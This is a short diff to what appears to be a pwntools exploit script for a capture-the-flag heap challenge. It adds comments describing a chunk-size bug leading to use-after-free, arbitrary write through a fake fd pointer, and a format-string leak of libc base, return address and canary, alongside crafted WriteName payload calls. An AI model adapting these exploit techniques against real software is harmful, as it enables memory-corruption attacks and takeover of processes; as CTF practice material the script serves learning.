@@ -1,3 +1,9 @@
+# Pwned locally
+# After two big chunks freed and combined, the first chunk's size will emerge a bug that its size equals the sum of the two chunks
+# Use this bug to override and lead to UAF
+# And this UAF lead to AnyMemWrite with the fake_fd
+# Meanwhile, fsb can leak libc_base/ret_addr/canary
+
 from pwn import *
 from binascii import *
 
@@ -54,6 +60,5 @@ WriteName(0x1a0,'1'*0xd0+p64(0xe0)+p64(fake_fd))#_1
 WriteName(0xc0,'22222222')#_2
 WriteName(0x50,payload)#4
 Bye()
-r.interactive()
 
-raw_input()
+r.interactive()
